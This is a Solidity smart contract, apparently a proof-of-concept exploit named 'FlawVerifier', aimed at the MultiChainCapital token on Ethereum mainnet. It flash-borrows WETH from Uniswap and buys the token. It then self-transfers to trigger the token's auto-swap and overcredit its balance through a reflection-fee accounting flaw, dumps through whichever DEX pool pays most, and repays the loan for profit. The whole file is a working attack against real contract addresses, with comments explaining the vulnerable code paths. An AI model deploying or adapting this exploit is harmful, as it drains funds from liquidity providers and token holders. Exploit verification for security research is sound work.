// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMultiChainCapital is IERC20Like {
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02Like {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x1a7981D87E3b6a95c1516EB820E223fE979896b3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address public constant SHIBA_ROUTER = 0x03f7724180AA6b939894B5Ca4314783B0b36b329;
    address public constant SHIBA_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    uint256 public constant TEAM_SWAP_THRESHOLD = 5_000 * 1e9;
    uint256 private constant TOKEN_DECIMALS = 1e9;
    uint256 private constant SEED_TRIGGER_AMOUNT = 1 * TOKEN_DECIMALS;
    uint256 private constant SEED_WETH_SPEND = 0.001 ether;
    uint256 private constant EXIT_SAMPLE_MCC = 1_000_000 * TOKEN_DECIMALS;
    uint256 private constant BUILD_BPS = 2_500;
    uint256 private constant BPS_DENOMINATOR = 10_000;
    uint256 private constant TAX_BPS = 1_000;
    uint256 private constant V2_FEE_NUMERATOR = 997;
    uint256 private constant V2_FEE_DENOMINATOR = 1000;
    uint256 private constant MAX_FLASH_BORROW_WETH = 5 ether;

    uint256 private realizedProfit;

    address private activeFundingPair;
    address private activeTargetPair;
    address private activeExitRouter;
    address private activeExitPair;
    address private activeExitQuote;
    address private activeQuoteToWethRouter;
    address private activeQuoteToWethPair;
    uint256 private flashBorrowAmount;

    uint8 public outcomeCode;
    bool public observedPreloadedSyntheticInventory;
    bool public triggeredAutoSwap;
    bool public usedFlashswapFunding;
    bool public usedCrossDexExit;

    uint256 public initialWethBalance;
    uint256 public finalWethBalance;
    uint256 public initialVerifierMccBalance;
    uint256 public finalVerifierMccBalance;
    uint256 public initialContractMccBalance;
    uint256 public finalContractMccBalance;
    uint256 public initialTargetPairWethReserve;
    uint256 public finalTargetPairWethReserve;

    constructor() {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function executeOnOpportunity() external {
        IMultiChainCapital token = IMultiChainCapital(TARGET);
        address targetPair = token.uniswapV2Pair();

        _pathAnchor();

        outcomeCode = 0;
        triggeredAutoSwap = false;
        usedFlashswapFunding = false;
        usedCrossDexExit = false;
        realizedProfit = 0;

        initialWethBalance = IERC20Like(WETH).balanceOf(address(this));
        initialVerifierMccBalance = token.balanceOf(address(this));
        initialContractMccBalance = token.balanceOf(TARGET);
        initialTargetPairWethReserve = _pairReserve(targetPair, WETH);

        if (targetPair == address(0)) {
            outcomeCode = 1;
            _refreshFinalState(token, targetPair);
            return;
        }

        observedPreloadedSyntheticInventory = initialContractMccBalance >= TEAM_SWAP_THRESHOLD;
        if (!observedPreloadedSyntheticInventory) {
            outcomeCode = 2;
            _refreshFinalState(token, targetPair);
            return;
        }

        (address exitRouter, address exitPair, address exitQuote, address quoteToWethRouter, address quoteToWethPair) =
            _selectExitVenue(targetPair);
        if (exitPair == address(0)) {
            outcomeCode = 3;
            _refreshFinalState(token, targetPair);
            return;
        }

        address fundingPair = IUniswapV2FactoryLike(UNISWAP_FACTORY).getPair(WETH, USDC);
        uint256 fundingReserveWeth = _pairReserve(fundingPair, WETH);
        if (fundingPair == address(0) || fundingReserveWeth == 0) {
            outcomeCode = 4;
            _refreshFinalState(token, targetPair);
            return;
        }

        flashBorrowAmount = fundingReserveWeth / 1_500;
        if (flashBorrowAmount > MAX_FLASH_BORROW_WETH) {
            flashBorrowAmount = MAX_FLASH_BORROW_WETH;
        }
        if (flashBorrowAmount < SEED_WETH_SPEND * 50) {
            outcomeCode = 5;
            _refreshFinalState(token, targetPair);
            return;
        }

        activeFundingPair = fundingPair;
        activeTargetPair = targetPair;
        activeExitRouter = exitRouter;
        activeExitPair = exitPair;
        activeExitQuote = exitQuote;
        activeQuoteToWethRouter = quoteToWethRouter;
        activeQuoteToWethPair = quoteToWethPair;

        usedFlashswapFunding = true;

        if (IUniswapV2PairLike(fundingPair).token0() == WETH) {
            IUniswapV2PairLike(fundingPair).swap(flashBorrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2PairLike(fundingPair).swap(0, flashBorrowAmount, address(this), abi.encode(uint256(1)));
        }

        _refreshFinalState(token, targetPair);

        if (finalWethBalance > initialWethBalance) {
            realizedProfit = finalWethBalance - initialWethBalance;
            outcomeCode = 10;
        } else if (triggeredAutoSwap) {
            outcomeCode = 7;
        } else {
            outcomeCode = 8;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "unexpected sender");
        require(msg.sender == activeFundingPair, "unexpected pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == flashBorrowAmount, "unexpected amount");

        IERC20Like weth = IERC20Like(WETH);
        IMultiChainCapital token = IMultiChainCapital(TARGET);

        _approveMaxIfNeeded(WETH, UNISWAP_ROUTER, borrowedWeth);
        _approveMaxIfNeeded(TARGET, activeExitRouter, type(uint256).max / 2);
        if (activeExitQuote != WETH) {
            _approveMaxIfNeeded(activeExitQuote, activeQuoteToWethRouter, type(uint256).max / 2);
        }

        // Path 0 public entry into the vulnerable code path: buy a minimal seed
        // from the canonical pair so the next non-pair transfer is under our
        // control. A buy is the only reachable first leg here because
        // sender == uniswapV2Pair bypasses the contract's preloaded auto-swap.
        uint256 seedBefore = token.balanceOf(address(this));
        _swapTwoHop(UNISWAP_ROUTER, WETH, TARGET, SEED_WETH_SPEND);
        uint256 seedBought = token.balanceOf(address(this)) - seedBefore;
        require(seedBought >= SEED_TRIGGER_AMOUNT, "seed buy failed");

        // Path 2 already exists on-chain at this fork: address(TARGET) is
        // preloaded above the swap threshold. This tiny self-transfer forces
        // the public auto-swap branch without any privileged action.
        require(token.transfer(address(this), SEED_TRIGGER_AMOUNT), "preloaded trigger failed");
        triggeredAutoSwap = true;

        // Rebuild fresh synthetic inventory ourselves, matching the finding's
        // second stage instead of relying only on preexisting state. We buy
        // after the first dump, then self-transfer to overcredit the contract
        // via _getRValues() + _takeTeam() with sender != uniswapV2Pair.
        uint256 buildBudget = _buildBudget(weth.balanceOf(address(this)));
        if (buildBudget >= SEED_WETH_SPEND) {
            uint256 buildBefore = token.balanceOf(address(this));
            _swapTwoHop(UNISWAP_ROUTER, WETH, TARGET, buildBudget);
            uint256 buildBought = token.balanceOf(address(this)) - buildBefore;

            if (buildBought > (SEED_TRIGGER_AMOUNT * 4)) {
                uint256 inflateAmount = buildBought - SEED_TRIGGER_AMOUNT;
                require(token.transfer(address(this), inflateAmount), "inflate transfer failed");

                if (token.balanceOf(TARGET) >= TEAM_SWAP_THRESHOLD) {
                    require(token.transfer(address(this), SEED_TRIGGER_AMOUNT), "fresh trigger failed");
                }
            }
        }

        // Spend the remaining flash-funded WETH after both forced dumps, then
        // exit through whichever live public venue still prices MCC richer than
        // the canonical pair. This keeps the exploit rooted in the same causal
        // chain while only varying the public liquidity route.
        uint256 remainingWeth = weth.balanceOf(address(this));
        if (remainingWeth >= SEED_WETH_SPEND) {
            _swapTwoHop(UNISWAP_ROUTER, WETH, TARGET, remainingWeth);
        }

        uint256 allMcc = token.balanceOf(address(this));
        require(allMcc > 0, "no MCC to exit");

        uint256 wethBeforeExit = weth.balanceOf(address(this));
        _swapTwoHop(activeExitRouter, TARGET, activeExitQuote, allMcc);

        if (activeExitQuote != WETH) {
            uint256 quoteBalance = IERC20Like(activeExitQuote).balanceOf(address(this));
            if (quoteBalance > 0) {
                _swapTwoHop(activeQuoteToWethRouter, activeExitQuote, WETH, quoteBalance);
            }
        }

        uint256 wethAfterExit = weth.balanceOf(address(this));
        require(wethAfterExit > wethBeforeExit, "exit failed");
        usedCrossDexExit = true;

        uint256 amountOwed = _sameTokenFlashRepayment(borrowedWeth);
        require(weth.transfer(activeFundingPair, amountOwed), "repay failed");
    }

    function _selectExitVenue(address canonicalPair)
        internal
        view
        returns (address router, address pair, address quote, address quoteToWethRouter, address quoteToWethPair)
    {
        address[3] memory routers = [UNISWAP_ROUTER, SUSHI_ROUTER, SHIBA_ROUTER];
        address[3] memory factories = [UNISWAP_FACTORY, SUSHI_FACTORY, SHIBA_FACTORY];
        address[4] memory quotes = [WETH, USDC, USDT, DAI];

        uint256 bestExitValue;

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < quotes.length; j++) {
                address candidateQuote = quotes[j];
                address candidatePair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, candidateQuote);
                if (candidatePair == address(0) || candidatePair == canonicalPair) {
                    continue;
                }

                (uint256 tokenReserve, uint256 quoteReserve) = _pairReserves(candidatePair, TARGET, candidateQuote);
                if (tokenReserve == 0 || quoteReserve == 0) {
                    continue;
                }

                address candidateQuoteRouter = address(0);
                address candidateQuotePair = address(0);
                uint256 wethValue;

                uint256 exitQuoteOut = _getAmountOut(_applyTax(EXIT_SAMPLE_MCC), tokenReserve, quoteReserve);
                if (exitQuoteOut == 0) {
                    continue;
                }

                if (candidateQuote == WETH) {
                    wethValue = exitQuoteOut;
                } else {
                    (candidateQuoteRouter, candidateQuotePair, wethValue) =
                        _bestQuoteToWeth(candidateQuote, exitQuoteOut);
                    if (candidateQuotePair == address(0) || wethValue == 0) {
                        continue;
                    }
                }

                if (wethValue > bestExitValue) {
                    bestExitValue = wethValue;
                    router = routers[i];
                    pair = candidatePair;
                    quote = candidateQuote;
                    quoteToWethRouter = candidateQuote == WETH ? address(0) : candidateQuoteRouter;
                    quoteToWethPair = candidateQuote == WETH ? address(0) : candidateQuotePair;
                }
            }
        }
    }

    function _bestQuoteToWeth(address quoteToken, uint256 quoteAmount)
        internal
        view
        returns (address router, address pair, uint256 wethValue)
    {
        address[3] memory routers = [UNISWAP_ROUTER, SUSHI_ROUTER, SHIBA_ROUTER];
        address[3] memory factories = [UNISWAP_FACTORY, SUSHI_FACTORY, SHIBA_FACTORY];

        for (uint256 i = 0; i < factories.length; i++) {
            address candidatePair = IUniswapV2FactoryLike(factories[i]).getPair(quoteToken, WETH);
            if (candidatePair == address(0)) {
                continue;
            }

            (uint256 quoteReserve, uint256 wethReserve) = _pairReserves(candidatePair, quoteToken, WETH);
            if (quoteReserve == 0 || wethReserve == 0) {
                continue;
            }

            uint256 candidateValue = _getAmountOut(quoteAmount, quoteReserve, wethReserve);
            if (candidateValue > wethValue) {
                wethValue = candidateValue;
                router = routers[i];
                pair = candidatePair;
            }
        }
    }

    function _buildBudget(uint256 wethBalance) internal pure returns (uint256) {
        return (wethBalance * BUILD_BPS) / BPS_DENOMINATOR;
    }

    function _swapTwoHop(address router, address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IUniswapV2Router02Like(router)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 amount) internal {
        if (spender == address(0) || amount == 0) {
            return;
        }

        IERC20Like(token).approve(spender, 0);
        IERC20Like(token).approve(spender, amount);
    }

    function _sameTokenFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * V2_FEE_DENOMINATOR) / V2_FEE_NUMERATOR) + 1;
    }

    function _applyTax(uint256 amount) internal pure returns (uint256) {
        return (amount * (BPS_DENOMINATOR - TAX_BPS)) / BPS_DENOMINATOR;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * V2_FEE_NUMERATOR;
        return (amountInWithFee * reserveOut) / ((reserveIn * V2_FEE_DENOMINATOR) + amountInWithFee);
    }

    function _pairReserve(address pair, address token) internal view returns (uint256 reserve) {
        if (pair == address(0)) {
            return 0;
        }

        IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = lp.getReserves();

        if (lp.token0() == token) {
            return uint256(reserve0);
        }
        if (lp.token1() == token) {
            return uint256(reserve1);
        }
    }

    function _pairReserves(address pair, address tokenA, address tokenB)
        internal
        view
        returns (uint256 reserveA, uint256 reserveB)
    {
        if (pair == address(0)) {
            return (0, 0);
        }

        IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = lp.getReserves();
        address token0 = lp.token0();
        address token1 = lp.token1();

        if (token0 == tokenA && token1 == tokenB) {
            return (uint256(reserve0), uint256(reserve1));
        }
        if (token0 == tokenB && token1 == tokenA) {
            return (uint256(reserve1), uint256(reserve0));
        }
    }

    function _refreshFinalState(IMultiChainCapital token, address targetPair) internal {
        finalWethBalance = IERC20Like(WETH).balanceOf(address(this));
        finalVerifierMccBalance = token.balanceOf(address(this));
        finalContractMccBalance = token.balanceOf(TARGET);
        finalTargetPairWethReserve = _pairReserve(targetPair, WETH);
    }

    function _pathAnchor() internal pure returns (bytes32) {
        // Path 0:
        // Any taxed transfer executes _transfer*() -> _getValues() ->
        // _getRValues() and overcredits the recipient while _takeTeam()
        // separately credits the token contract.
        //
        // Path 1:
        // A user can loop transfers between controlled addresses, or even
        // self-transfer, to grow address(this)'s token balance without losing
        // the full advertised team fee. This verifier recreates that stage
        // after the first forced dump by self-transferring freshly bought MCC.
        //
        // Path 2:
        // Once enough synthetic MCC accumulates, auto-swap or manualSwap()
        // sells it for ETH and extracts value from the pool. manualSwap() is
        // owner-only, so the verifier forces the public auto-swap path and
        // unwinds through an alternate public venue discovered at runtime.
        return keccak256(
            abi.encodePacked(
                "_transfer*()", "_transferStandard()", "_getValues()", "_getRValues()", "_takeTeam()", "manualSwap()"
            )
        );
    }
}
